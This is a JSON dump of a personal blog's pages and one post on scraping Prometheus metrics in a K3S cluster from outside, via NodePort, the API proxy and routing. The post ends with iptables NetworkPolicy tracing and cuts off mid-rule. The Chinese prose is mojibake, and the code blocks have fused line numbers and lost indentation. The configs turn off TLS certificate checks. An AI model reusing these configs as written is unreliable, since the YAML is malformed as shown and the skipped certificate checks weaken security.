{"meta":{"title":"Stdio's Blog","subtitle":"éšä¾¿å†™å†™","description":null,"author":"David Dai","url":"https://blog.stdioa.com"},"pages":[{"title":"404!","date":"1969-12-31T16:00:00.000Z","updated":"2017-06-29T04:38:39.767Z","comments":false,"path":"404.html","permalink":"https://blog.stdioa.com/404.html","excerpt":"","text":"404 Not Foundç‚¹å‡»å·¦ä¾§å¤´åƒè¿”å›é¦–é¡µ"},{"title":"å…³äºæˆ‘","date":"2020-04-08T13:10:07.647Z","updated":"2019-04-06T12:17:16.967Z","comments":false,"path":"about/index.html","permalink":"https://blog.stdioa.com/about/index.html","excerpt":"","text":"ç®€ä»‹æ˜µç§°ï¼šå°æˆ´ã€‚å¾ˆå¤šå§“æˆ´çš„äººéƒ½æœ‰è¿™æ ·ä¸€ä¸ªæ˜µç§° ğŸ˜‚å—äº¬èˆªç©ºèˆªå¤©å¤§å­¦ 2013çº§ ä¿¡æ¯å®‰å…¨ä¸“ä¸šLCTT æˆå‘˜ï¼Œæ›¾ç»æ˜¯æ‰‡è´ç½‘åç«¯å·¥ç¨‹å¸ˆæ›¾ç»æ˜¯å¤©å¤©ç¼ºè§‰çš„â€œç‰¹å›°ç”Ÿâ€ï¼Œç„¶è€Œç°åœ¨å¤©å¤©æ—©ç¡æ—©èµ·ï¼ˆç®—æ˜¯å§ï¼‰è¢«åŒå­¦ç§°ä¸ºâ€œé‡‘é™µä¸ˆé‡è€…â€ï¼Œå¸Œæœ›æœ‰ä¸€å¤©èƒ½å¤Ÿèµ°éå—äº¬äººç”Ÿè‹¦çŸ­ï¼Œæˆ‘ç”¨ Python ä¸šä½™çˆ±å¥½ç¾½æ¯›çƒã€ä¹’ä¹“çƒã€å¤å…¸éŸ³ä¹ã€é’¢ç´ã€å’–å•¡ã€‚ æ¶‰çŒé¢†åŸŸ ç¼–ç¨‹è¯­è¨€C / C++ / Pythonï¼ˆä¸»è¦å¼€å‘è¯­è¨€ï¼‰ / Go / Node.jsï¼ˆä¼šä¸€äº›) Web å¼€å‘å‰ç«¯: HTML / CSS / Javascript(ES6)ç»„ä»¶åº“ï¼šReact.js(ä¼šä¸€ç‚¹) / Vue.js (Vue.js + vuex + vue-router)æ ·å¼åº“ï¼šSemantic UIåç«¯:Web æ¡†æ¶ï¼šFlask / Django / Bottle / ExpressRPC æ¡†æ¶ï¼šgRPC / seaæ•°æ®åº“: MySQL / MongoDBï¼ˆäº†è§£ï¼‰ / Redis DevOpsKubernetes / GitLab CI/CD ç¼–ç¨‹å·¥å…·ä»£ç ç¼–è¾‘å™¨: Sublime Text &amp; VS Codeç‰ˆæœ¬æ§åˆ¶: Gitï¼ˆç†Ÿç»ƒï¼‰ä»£ç æ„å»º: gulp, babel, webpack ä¸ªäººé¡µé¢Githubä»“åº“Codingä»“åº“åšå®¢LCTT ä¸»é¡µæˆ‘çš„ä¹è°±åˆ†äº«ç«™ è”ç³»æˆ‘E-mail: c3RkaW9hQDE2My5jb20=Telegram: @StdioA"},{"title":"å‹æƒ…é“¾æ¥","date":"2020-04-08T13:10:07.678Z","updated":"2018-11-27T00:19:59.433Z","comments":true,"path":"links/index.html","permalink":"https://blog.stdioa.com/links/index.html","excerpt":"","text":""},{"title":"åˆ†ç±»","date":"2020-04-08T13:10:07.662Z","updated":"2018-07-11T12:29:12.213Z","comments":false,"path":"categories/index.html","permalink":"https://blog.stdioa.com/categories/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2020-04-08T13:10:08.548Z","updated":"2018-07-11T12:29:12.215Z","comments":false,"path":"tags/index.html","permalink":"https://blog.stdioa.com/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2020-04-08T13:10:08.194Z","updated":"2018-07-11T12:29:12.214Z","comments":false,"path":"repository/index.html","permalink":"https://blog.stdioa.com/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"åœ¨ K3S é›†ç¾¤å¤–ç›‘æ§é›†ç¾¤å†…çš„æŒ‡æ ‡","slug":"scrape-prometheus-metrics-outside-kubernetes","date":"2021-07-11T09:00:00.000Z","updated":"2021-07-11T11:58:14.131Z","comments":true,"path":"2021/07/scrape-prometheus-metrics-outside-kubernetes/","link":"","permalink":"https://blog.stdioa.com/2021/07/scrape-prometheus-metrics-outside-kubernetes/","excerpt":"åƒé¥±äº†æ’‘çš„ï¼Œå°è¯•ä¸€ä¸‹ Prometheus åœ¨ K3S é›†ç¾¤å¤–æŠ“å–é›†ç¾¤å†…æŒ‡æ ‡çš„è‹¥å¹²å§¿åŠ¿ã€‚","text":"åƒé¥±äº†æ’‘çš„ï¼Œå°è¯•ä¸€ä¸‹ Prometheus åœ¨ K3S é›†ç¾¤å¤–æŠ“å–é›†ç¾¤å†…æŒ‡æ ‡çš„è‹¥å¹²å§¿åŠ¿ã€‚ èƒŒæ™¯å‰ä¸€é˜µå­æ”¶äº†å—æ ‘è“æ´¾ 4ï¼Œé¡ºæ‰‹åœ¨ä¸Šé¢æ­äº†ä¸€ä¸ªå•èŠ‚ç‚¹çš„ K3S. å‡ ä¸ªæœˆå‰åœ¨å®¶é‡Œçš„æœåŠ¡å™¨ä¸Šæ­è¿‡ä¸€ä¸ª Prometheus çš„å®ä¾‹ï¼Œäºæ˜¯å°±å†³å®šç ”ç©¶ä¸‹å¦‚ä½•åœ¨é›†ç¾¤å¤–æ”¶é›† K3S é›†ç¾¤å†… Pod çš„æŒ‡æ ‡ã€‚å…ˆä¸Šä¸€ä¸ªç®€å•çš„ç½‘ç»œæ‹“æ‰‘å›¾ï¼šä¼—æ‰€å‘¨çŸ¥ï¼ˆï¼Ÿï¼‰ï¼ŒPod Network å’Œ Node Network æ˜¯ä¸¤ä¸ªä¸åŒçš„ç½‘æ®µï¼Œæ‰€ä»¥åœ¨ Node ä¹‹å¤–æ˜¯æ— æ³•ç›´æ¥è®¿é—®åˆ° Pod çš„ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€äº›æ–¹æ³•ï¼Œè®©æˆ‘ä»¬ç›´æ¥æˆ–é—´æ¥åœ°è®¿é—® Pod ä¸­æä¾›çš„ HTTP æ¥å£ï¼Œè¿›è€Œå®ŒæˆæŒ‡æ ‡æŠ“å–ã€‚æˆ‘ä»¬åœ¨ k3s é›†ç¾¤ä¸­éƒ¨ç½²äº†ä¸€ä¸ªæš´éœ²æ¥å£çš„ Deployment ç”¨äºæŒ‡æ ‡æŠ“å–æµ‹è¯•ï¼Œå®ƒçš„æŒ‡æ ‡ç«¯ç‚¹ä¸º http://localhost/metrics.Deployment é…ç½®å¦‚ä¸‹ï¼š123456789101112131415161718192021222324apiVersion: apps/v1kind: Deploymentmetadata: name: promtest namespace: defaultspec: selector: matchLabels: app: promtest replicas: 1 template: metadata: labels: app: promtest annotations: prometheus.io/scrape: \"true\" spec: containers: - name: main image: prometheus-test:v0.1 command: [\"/bin/promtest\"] args: [\"-listen\", \"0.0.0.0:80\"] ports: - containerPort: 80 NodePort Serviceæœ€ç®€å•ã€æœ€ç›´è§‚çš„æ–¹æ³•ï¼Œæ˜¯å°† metrics endpoint é€šè¿‡ NodePort Service æˆ– Ingress æš´éœ²å‡ºæ¥ï¼Œç„¶ååœ¨ Prometheus ä¸­é€šè¿‡é…ç½® static_config æ¥æŠ“å–ã€‚æ¯”å¦‚æˆ‘ä»¬å¯ä»¥é…ç½®å¦‚ä¸‹çš„ Service å’Œ Ingress:1234567891011121314151617181920212223242526272829303132333435apiVersion: v1kind: Servicemetadata: name: promtest namespace: default labels: app: promtest annotations: prometheus.io/scrape: \"true\"spec: selector: app: promtest ports: - protocol: TCP port: 80 targetPort: 80 type: NodePort---apiVersion: networking.k8s.io/v1kind: Ingressmetadata: name: promtest namespace: defaultspec: rules: - host: promtest.k3s http: paths: - path: / pathType: Prefix backend: service: name: promtest port: number: 80éƒ¨ç½²åæŸ¥çœ‹ Service çš„ NodePortï¼ˆå¦‚ 30080ï¼‰ï¼Œåˆ™å¯ä»¥é€šè¿‡ Node çš„ç«¯å£è®¿é—®åˆ°æŒ‡æ ‡ç«¯ç‚¹ï¼ˆä¹Ÿå°±æ˜¯ http://192.168.1.101:30080/metricsï¼‰ï¼›ç±»ä¼¼çš„ï¼Œé€šè¿‡é…ç½®çš„ Ingress ä¹Ÿå¯ä»¥æ­£å¸¸è®¿é—®ï¼ˆhttp://promtest.k3s/metricsï¼‰ã€‚Prometheus æŠ“å–è§„åˆ™å¦‚ä¸‹ï¼š12345job_name: \"exported-services\"static_configs: - targets: - 192.168.1.101:30080 # NodePort - promtest.k3s # Ingressè¿™ç§æ–¹å¼éƒ¨ç½²æ¯”è¾ƒç›´è§‚ç®€å•ï¼Œä½†ç¼ºé™·ä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼šç”±äºæŠ“å–è§„åˆ™éƒ½æ˜¯é™æ€çš„ï¼Œæ‰€ä»¥ä¸èƒ½åšæœåŠ¡å‘ç°ï¼›æ¯æ·»åŠ ä¸€ä¸ª Deploymentï¼Œéœ€è¦é…ç½®å¯¹åº”çš„ Service æ¥æš´éœ²æŒ‡æ ‡ï¼›Service è‡ªå¸¦è´Ÿè½½å‡è¡¡ï¼Œæ‰€ä»¥å¦‚æœ Service èƒŒåçš„ Endpoint æœ‰å¤šä¸ªï¼Œé‚£ä¹ˆå¤šæ¬¡æŠ“å–çš„æ•°æ®æ¥æºåˆ™å¯èƒ½æ˜¯ Serivce èƒŒåçš„ä»»æ„ä¸€ä¸ª Podï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ— æ³•å¯¹æ¥æºè¿›è¡ŒåŒºåˆ†ã€‚å› æ­¤ï¼Œå½“æˆ‘ä»¬åˆ†æä¸šåŠ¡æŒ‡æ ‡æ—¶ï¼Œé€šå¸¸éƒ½ä¼šé€šè¿‡æœåŠ¡å‘ç°æ¥æŠ“å–æ‰€æœ‰ Pod çš„æŒ‡æ ‡ï¼Œç„¶åé€šè¿‡ PromQL æ ¹æ®å®é™…åœºæ™¯å¯¹æŒ‡æ ‡è¿›è¡Œèšåˆã€‚ Kubernetes API Proxyè¿™ç§æ–¹å¼ç•¥å¾®æœ‰ç‚¹å¥‡æ€ªï¼šä½¿ç”¨ K8S æä¾›çš„ pod/service proxy æ¥å£ï¼Œé€šè¿‡ä»£ç†æ¥è®¿é—®é›†ç¾¤å†…çš„ Pod æŒ‡æ ‡ç«¯ç‚¹.å‡è®¾ K8S API åœ°å€ä¸º https://k3s:6443ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬æƒ³è®¿é—® Service proxy æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡ https://k3s:6443/api/v1/namespaces/&lt;namespace&gt;/services/&lt;service_name&gt;[:&lt;service_port&gt;]/proxy/metrics æ¥è·å–ã€‚ç›¸åº”åœ°ï¼ŒæŠ“å– Pod æŒ‡æ ‡æ—¶ï¼Œå¯¹åº”çš„ API åœ°å€ä¸º https://k8s:6443/api/v1/namespaces/&lt;namespace&gt;/pods/&lt;pod_name&gt;[:&lt;pod_port&gt;]/proxy/metricsä¸ K8S API è¿›è¡Œäº¤äº’æ—¶ï¼Œéœ€è¦é¦–å…ˆé…ç½®èº«ä»½ä¿¡æ¯ã€‚é€šå¸¸æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ¥è®¿é—®ï¼šHTTPS å®¢æˆ·ç«¯è¯ä¹¦ï¼Œä¸€èˆ¬æƒ…å†µä¸‹äººç±»ç”¨æˆ·ä¼šé€šè¿‡è¿™ç§æ–¹å¼æ¥è®¿é—®ï¼›ä¸æä¾› HTTPS å®¢æˆ·ç«¯è¯ä¹¦ï¼Œä½†åœ¨ HTTP ä¼šè¯ä¸­é€šè¿‡ Bearer Token çš„æ–¹å¼æä¾› ServiceAccount çš„ JWT Tokenï¼Œè€Œè¿™é€šå¸¸æ˜¯é›†ç¾¤å†…çš„ç¨‹åºè®¿é—® K8S API çš„æ–¹å¼ã€‚Prometheus å¯¹è¿™ä¸¤ç§æ–¹å¼å‡æä¾›äº†æ”¯æŒï¼Œä¸è¿‡æˆ‘è¿˜æ˜¯é€‰æ‹©äº†é…ç½® ServiceAccount æ¥ä¸ K8S äº¤äº’ã€‚ é…ç½® ServiceAccount åŠå¯¹åº”çš„ RBAC ç­–ç•¥ä¸ºäº†å®Œæˆ K8S èº«ä»½è®¤è¯ä»¥åŠæ¥å£é‰´æƒï¼Œæˆ‘ä»¬éœ€è¦é…ç½®ä»¥ä¸‹èµ„æºï¼šServiceAccountï¼Œç”¨äºèº«ä»½è®¤è¯ï¼›ClusterRoleï¼Œå®šä¹‰è§’è‰²å’Œæƒé™ï¼›ClusterRoleBindingï¼Œå°† ClusterRole çš„æƒé™èµ‹äºˆ ServiceAccount.Prometheus Operator æ–‡æ¡£ ä¸­æä¾›äº†ä¸€å¥—å®Œæ•´çš„ Service Account å’Œ RBAC é…ç½®ç¤ºä¾‹ï¼Œç”¨äºè¿›è¡ŒæœåŠ¡å‘ç°ã€‚ç”±äºæˆ‘ä»¬è¿˜éœ€è¦è°ƒç”¨ service å’Œ pod çš„ proxy æ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦é¢å¤–æ·»åŠ ä¸¤ä¸ª API æƒé™ï¼š12345- apiGroups: [\"\"] resources: - services/proxy - pods/proxy verbs: [\"get\"]é…ç½®å¥½ ServiceAccount åï¼Œæˆ‘ä»¬å¯ä»¥ä»åä¸º &lt;service_account_name&gt;_token çš„ Secret ä¸­è·å–ç”¨äºèº«ä»½éªŒè¯çš„ JWT Token. é…ç½®æœåŠ¡å‘ç°å’ŒæŠ“å–è§„åˆ™å¦‚æœ Serivce æˆ– Pod åæ˜¯å·²ç»ç¡®å®šå¥½çš„ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥é€šè¿‡é…ç½® static_config æ¥è¿›è¡ŒæŠ“å–ï¼›ä½†å¦‚æœç”¨åˆ°äº† K8S çš„æœåŠ¡å‘ç°ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦é€šè¿‡æœåŠ¡å‘ç°çš„å…ƒä¿¡æ¯æ¥ç¡®å®šæŒ‡æ ‡æŠ“å–çš„ç›®æ ‡åœ°å€ã€‚relabel_config é…ç½®ä¸­ï¼Œæœ‰å‡ ä¸ªç‰¹æ®Šçš„ labelï¼Œå¯ä»¥ç”¨æ¥ç»™æˆ‘ä»¬åŠ¨æ€é…ç½®æŠ“å–çš„åœ°å€å’Œåè®®ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š__address__ï¼Œç”¨äºé…ç½®ç›®æ ‡åœ°å€çš„ host å’Œç«¯å£ï¼›__metrics_path__ï¼Œç”¨äºé…ç½®ç›®æ ‡åœ°å€çš„è·¯å¾„ï¼›__scheme__ï¼Œç”¨äºé…ç½®æŠ“å–æ—¶ä½¿ç”¨çš„åè®®ï¼ˆhttp æˆ– httpsï¼‰ï¼›__params_&lt;name&gt;ï¼Œç”¨äºåœ¨æŠ“å–çš„ URL ä¸­æ³¨å…¥ query.æœ‰äº†è¿™å‡ ä¸ªæ ‡ç­¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸€å®šçš„è§„åˆ™æ¥æ‹¼å‡‘å‡ºç›®æ ‡åœ°å€äº†ã€‚å…·ä½“æŠ“å–è§„åˆ™å¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657job_name: 'k3s-pod-via-api'scheme: httpstls_config: insecure_skip_verify: true # è·³è¿‡æœåŠ¡å™¨è¯ä¹¦éªŒè¯ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨ ca_file é…ç½®æœåŠ¡å™¨è¯ä¹¦authorization: credentials_file: /etc/prometheus/k8s_token # æ–‡ä»¶ä¸­å­˜æœ‰ ServiceAccount tokenkubernetes_sd_configs: # æœåŠ¡å‘ç°é…ç½® - api_server: https://k3s:6443 # K8S API åœ°å€ role: pod tls_config: # è¿™éƒ¨åˆ†è·Ÿä¸Šé¢å·®ä¸å¤š insecure_skip_verify: true authorization: credentials_file: /etc/prometheus/k8s_token namespaces: # å¯é€‰çš„ namespace é…ç½® names: - default selectors: # å¯é€‰çš„ label selector - role: pod label: \"app=promtest\"relabel_configs:# åªæŠ“å–åŒ…å« `prometheus.io/scrape: true` annotation çš„ Pod- source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape] action: keep regex: 'true'# å¦‚æœå®šä¹‰äº† `prometheus.io/port` æ³¨è§£ï¼Œåˆ™ç”¨å®ƒè¦†ç›– Pod å®šä¹‰ä¸­çš„ç«¯å£å·- source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_port] action: replace regex: (\\d+) replacement: $1 target_label: __meta_kubernetes_pod_container_port_number# åŠ¨æ€æ„å»º K8S proxy API åœ°å€- source_labels: [__meta_kubernetes_namespace, __meta_kubernetes_pod_name, __meta_kubernetes_pod_container_port_number] action: replace regex: (.+);(.+);(.+) replacement: api/v1/namespaces/$1/pods/$2:$3/proxy/metrics target_label: __metrics_path__# é€šè¿‡ `prometheus.io/path` æ³¨è§£è‡ªå®šä¹‰æŠ“å–è·¯å¾„- source_labels: [__metrics_path__, __meta_kubernetes_pod_annotation_prometheus_io_path] action: replace regex: (.+)/metrics;/?(.+) replacement: $1/$2 target_label: __metrics_path__# Host å’Œ Port æ˜¯ç¡®å®šçš„- source_labels: [] action: replace regex: \"\" replacement: a.r8:6443 target_label: __address__# å°†ä¸€äº›å…ƒä¿¡æ¯æ³¨å…¥åˆ° metrics æ ‡ç­¾ä¸­- action: labelmap regex: __meta_kubernetes_pod_label_(.+)- source_labels: [__meta_kubernetes_namespace] action: replace target_label: k8s_namespace- source_labels: [__meta_kubernetes_pod_name] action: replace target_label: k8s_pod_nameService çš„æŠ“å–å’Œ Pod å¤§åŒå°å¼‚ï¼Œåªæ˜¯ç›®æ ‡åœ°å€å’Œ meta æ ‡ç­¾åä¸å¤ªä¸€æ ·ï¼Œå°±ä¸èµ˜è¿°äº†ã€‚è¿™ç§æ–¹å¼å¯ä»¥ä½¿ç”¨ K8S çš„æœåŠ¡å‘ç°åŠŸèƒ½ï¼Œä½†é€šè¿‡ proxy API æ¥è®¿é—® Podï¼Œä¹ŸåŠ é‡äº† kube-apiserver çš„è´Ÿæ‹…ã€‚è€Œä¸”ï¼Œè¯´å¥å®è¯ï¼Œå†™è¿™ç§æ‹¼å‡‘ API åœ°å€çš„ relabel_config è¿˜æ˜¯æŒºè›‹ç–¼çš„ã€‚ ğŸŒšå¦‚æœä¸ä½¿ç”¨ K8S çš„ proxy API çš„è¯ï¼Œä¹Ÿå¯ä»¥ç®€å•åœ¨é›†ç¾¤å†…éƒ¨ç½²ä¸€ä¸ª HTTP åå‘ä»£ç†ï¼Œç„¶åé€šè¿‡åä»£æ¥æŠ“å– Pod æˆ– Service çš„æŒ‡æ ‡ã€‚è¿™ä¸ªæ–¹æ¡ˆå…¶å®è·Ÿä¸Šä¸€ç§å·®ä¸å¤šï¼Œåªæ˜¯æŠŠ kube-apiserver çš„ proxy æ¢æˆäº†é›†ç¾¤å†…çš„å¦å¤–ä¸€ä¸ª proxy è€Œå·²ï¼Œä¸è¿‡å‡è½»äº† kube-apiserver çš„è´Ÿæ‹…ã€‚è€ƒè™‘åˆ°å®‰å…¨å› ç´ ï¼Œæˆ‘ä»¬å¯ä»¥ä¸º proxy é…ç½® egress NetworkPolicy æ¥æ§åˆ¶å®ƒå¯ä»¥è®¿é—®çš„ Podï¼Œä½†è¿™æ ·ä¹Ÿä¼šä½¿æƒé™å’Œé€‰æ‹©ç­–ç•¥å˜å¾—æä¸ºåˆ†æ•£ã€‚ æ‰“é€š Node Network å’Œ Pod/Service Networkè¿™ç§æ–¹æ³•ç®—æ˜¯ä»æ ¹æœ¬ä¸Šè§£å†³é—®é¢˜ï¼šæ‰“é€š Node å’Œ Pod / Service ç½‘ç»œï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è®¿é—® Pod æˆ– Service çš„ IP æ¥æŠ“å–æŒ‡æ ‡ã€‚æ‰“é€šç½‘ç»œçš„æ“ä½œä¸»è¦å‚è€ƒäº†ä¸¤ç¯‡æ–‡ç« ï¼šã€ŠåŠå…¬ç¯å¢ƒä¸‹ kubernetes ç½‘ç»œäº’é€šæ–¹æ¡ˆã€‹ä»¥åŠã€Šæ‰“é€š Kubernetes å†…ç½‘ä¸å±€åŸŸç½‘çš„Nç§æ–¹æ³•ã€‹ï¼Œæœ€åé€‰æ‹©ä»ç½‘ç»œå±‚æ‰“é€šç½‘ç»œã€‚æ“ä½œå¾ˆç®€å•ï¼Œåªéœ€è¦åœ¨ server ä¸­é…ç½®ä¸¤æ¡è·¯ç”±è§„åˆ™å³å¯ï¼š12ip route add 10.42.0.0/16 via 192.168.1.101 dev enp1s0ip route add 10.43.0.0/16 via 192.168.1.101 dev enp1s0å¦‚æœæƒ³è¦åœ¨å±€åŸŸç½‘å†…æ‰“é€šçš„è¯ï¼Œå¯ä»¥åœ¨è·¯ç”±å™¨çš„ç®¡ç†åå°æ¥é…ç½®é™æ€è·¯ç”±è§„åˆ™ï¼›å¦‚æœé›†ç¾¤å­˜åœ¨å¤šä¸ªèŠ‚ç‚¹ï¼Œåˆ™è¿˜éœ€åœ¨ Node çš„ iptables ä¸­é…ç½® MASQUERADE è§„åˆ™ç”¨äºè½¬å‘ã€‚é…ç½®å®Œæˆåï¼ŒPrometheus å°±å¯ä»¥ç›´æ¥é€šè¿‡ Pod IP æˆ– Service çš„ Cluster IP æ¥æŠ“å–æŒ‡æ ‡äº†ã€‚Pod çš„æŠ“å–è§„åˆ™å¦‚ä¸‹ï¼š1234567891011121314151617181920212223242526272829303132333435job_name: 'k3s-pod'# æŠ“å–æ—¶ç›´æ¥é€šè¿‡ HTTP åè®®ä» Pod IP æŠ“å–ï¼Œæ‰€ä»¥æ— éœ€é‰´æƒkubernetes_sd_configs: # æœåŠ¡å‘ç°é…ç½®ä¸å˜ - api_server: https://k8s:6443 role: pod tls_config: insecure_skip_verify: true authorization: credentials_file: /etc/prometheus/k8s_tokenrelabel_configs: # ç­›é€‰æ³¨è§£è§„åˆ™åŒä¸Š - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape] action: keep regex: 'true' # æ ¹æ® `prometheus.io/path` æ³¨è§£ç›´æ¥è¦†ç›–æŒ‡æ ‡è·¯å¾„ - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path] action: replace regex: (.+) target_label: __metrics_path__ # æ ¹æ® `prometheus.io/port` æ³¨è§£è¦†ç›–ç«¯å£ - source_labels: [__address__, __meta_kubernetes_pod_annotation_prometheus_io_port] action: replace regex: ([^:]+)(?::\\d+)?;(\\d+) replacement: $1:$2 target_label: __address__ # å…ƒä¿¡æ¯è§„åˆ™åŒä¸Š - action: labelmap regex: __meta_kubernetes_pod_label_(.+) - source_labels: [__meta_kubernetes_namespace] action: replace target_label: k8s_namespace - source_labels: [__meta_kubernetes_pod_name] action: replace target_label: k8s_pod_nameService çš„æŠ“å–è§„åˆ™ç•¥ã€‚å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—® Podï¼Œé‚£ä¹ˆæŠ“å–æ—¶çš„ relabel è§„åˆ™å°±å¯ä»¥ç®€åŒ–å¾ˆå¤šã€‚ ä¸€ä¸ªç¼ºä¹ç»éªŒå¯¼è‡´çš„æ— è°“ troubleshootingä¹‹å‰é€šè¿‡ Argo CD å®‰è£…è„šæœ¬ åœ¨é›†ç¾¤å†…å®‰è£…äº† Argo CD. å½“æˆ‘é…å®Œä¸Šé¢çš„è§„åˆ™ä»¥åï¼Œæˆ‘å‘ç° argocd-metrics Service çš„æŒ‡æ ‡æ— æ³•é€šè¿‡ Cluster IP æŠ“å–ï¼ˆæŠ¥é”™â€Connection refusedâ€œï¼‰ï¼Œè€Œ argocd-server-metrics å°±å¯ä»¥ã€‚è€Œåœ¨ Node ä¸Šï¼Œä¸¤ä¸ªæœåŠ¡å‡å¯ä»¥æ­£å¸¸è®¿é—®ã€‚æŸ¥äº† Node ä¸Šçš„ iptables è§„åˆ™ï¼Œæ²¡æœ‰åœ¨ Service (argocd-metrics) åˆ° Pod (argocd-application-controller-0) çš„è½¬å‘é“¾è·¯ä¸­å‘ç°ä»»ä½•å¼‚å¸¸ï¼Œç›´æ¥è®¿é—® Pod IP ä¹ŸéªŒè¯äº†è¿™ä¸€ç‚¹ã€‚ä½†ç”±äºç¼ºä¹ iptables debug ç»éªŒï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°è®¿é—® Pod IP è¢«æ‹’ç»çš„åŸå› ã€‚æœ€åé€šè¿‡ç„å­¦ debugï¼Œå‘ç° argocd namespace çš„äº”ä¸ª Pod é‡Œï¼Œåªæœ‰ä¸€ä¸ªå¯ä»¥æ­£å¸¸è®¿é—®ï¼Œæœ€åæ‰¾åˆ°äº†å®‰è£…è„šæœ¬ä¸­é…ç½®çš„ NetworkPolicyï¼Œå‘ç°æœ‰äº”ä¸ª NetworkPolicy é™åˆ¶äº†æ¯ä¸ª Pod çš„ ingress æ¥æºã€‚å°† Node æ‰€åœ¨å±€åŸŸç½‘çš„ CIDRï¼ˆ192.168.1.1/24ï¼‰æ·»åŠ è‡³ argocd-application-controller-network-policy çš„ ingress ç™½åå•ä¸­ï¼Œé—®é¢˜è§£å†³ã€‚è¯´å®è¯ï¼Œä¹‹å‰ç¡®å®æ²¡æœ‰æ€ä¹ˆæ¥è§¦è¿‡ NetworkPolicyï¼Œå¯¼è‡´è¿™ä¸ªé—®é¢˜æˆ‘æŸ¥äº†å°†è¿‘å››å¤©æ‰æŸ¥å‡ºæ¥â€¦äº‹ååˆ†æå®Œæ•´çš„è½¬å‘é“¾å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728# Service -&gt; Pod with DNAT-A KUBE-SERVICES -d 10.43.4.242/32 -p tcp -m tcp --dport 8082 -m comment --comment \"argocd/argocd-metrics:metrics cluster IP\" -j KUBE-SVC-SZWGFJCG7JW62ZG2-A KUBE-SVC-SZWGFJCG7JW62ZG2 -m comment --comment \"argocd/argocd-metrics:metrics\" -j KUBE-SEP-VYRHUQXWRJ6MSGOH-A KUBE-SEP-VYRHUQXWRJ6MSGOH -p tcp -m tcp -m comment --comment \"argocd/argocd-metrics:metrics\" -j DNAT --to-destination 10.42.0.38:8082# Pod è½¬å‘è‡³ pod é˜²ç«å¢™-A KUBE-ROUTER-OUTPUT -d 10.42.0.38/32 -m comment --comment \"rule to jump traffic destined to POD name:argocd-application-controller-0 namespace: argocd to chain KUBE-POD-FW-XIOATVM5TOINSO4V\" -j KUBE-POD-FW-XIOATVM5TOINSO4V-A KUBE-POD-FW-XIOATVM5TOINSO4V -m conntrack --ctstate RELATED,ESTABLISHED -m comment --comment \"rule for stateful firewall for pod\" -j ACCEPT# é€šè¿‡ local mode (ä¹Ÿå°±æ˜¯ä» node ip) è®¿é—® pod çš„åŒ…éƒ½ä¼šè¢«æ‰¹å‡†-A KUBE-POD-FW-XIOATVM5TOINSO4V -d 10.42.0.38/32 -m addrtype --src-type LOCAL -m comment --comment \"rule to permit the traffic traffic to pods when source is the pod\\'s local node\" -j ACCEPT# æ¥å— argocd-application-controller-network-policy çš„è§„åˆ™åˆ¤æ–­ï¼Œé€šè¿‡åä¼šè¢«æ‰“ä¸Šæ ‡è®°-A KUBE-POD-FW-XIOATVM5TOINSO4V -m comment --comment \"run through nw policy argocd-application-controller-network-policy\" -j KUBE-NWPLCY-5VLCZNPWIAXAL2HB-A KUBE-POD-FW-XIOATVM5TOINSO4V -m mark ! --mark 0x10000/0x10000 -m limit --limit 10/min --limit-burst 10 -m comment --comment \"rule to log dropped traffic POD name:argocd-application-controller-0 namespace: argocd\" -j NFLOG --nflog-group 100# æ²¡æœ‰æ ‡è®°ï¼ˆæ²¡é€šè¿‡è§„åˆ™åˆ¤æ–­ï¼‰ï¼Œå°±ä¼šæ‹’ç»è¿æ¥-A KUBE-POD-FW-XIOATVM5TOINSO4V -m mark ! --mark 0x10000/0x10000 -m comment --comment \"rule to REJECT traffic destined for POD name:argocd-application-controller-0 namespace: argocd\" -j REJECT --reject-with icmp-port-unreachable# ç¬¬ä¸€æ¡ namespaceSelector è§„åˆ™ï¼Œå¯¹åº” 8082 ç«¯å£# namespaceSelector: &#123;&#125;# æ»¡è¶³æ¡ä»¶åˆ™ä¼šæ‰“ä¸Šæ ‡è®°ï¼Œç„¶å return-A KUBE-NWPLCY-5VLCZNPWIAXAL2HB -p tcp -m set --match-set KUBE-SRC-DRBIHPAD4OLOF546 src -m set --match-set KUBE-DST-DM6ZQPCTKCXEROGZ dst -m tcp --dport 8082 -m comment --comment \"rule to mark traffic matching a network policy\" -m comment --comment \"rule to ACCEPT traffic from source pods to dest pods selected by policy name argocd-application-controller-network-policy namespace argocd\" -j MARK --set-xmark 0x10000/0x10000-A KUBE-NWPLCY-5VLCZNPWIAXAL2HB -p tcp -m set --match-set KUBE-SRC-DRBIHPAD4OLOF546 src -m set --match-set KUBE-DST-DM6ZQPCTKCXEROGZ dst -m tcp --dport 8082 -m comment --comment \"rule to RETURN traffic matching a network policy\" -m mark --mark 0x10000/0x10000 -m comment --comment \"rule to ACCEPT traffic from source pods to dest pods selected by policy name argocd-application-controller-network-policy namespace argocd\" -j RETURN# è‡ªå·±åŠ ä¸Šå»çš„ç¬¬äºŒæ¡ ipBlock cidr è§„åˆ™ï¼Œ8082 ç«¯å£# ipBlock:# cidr: 192.168.1.0/24-A 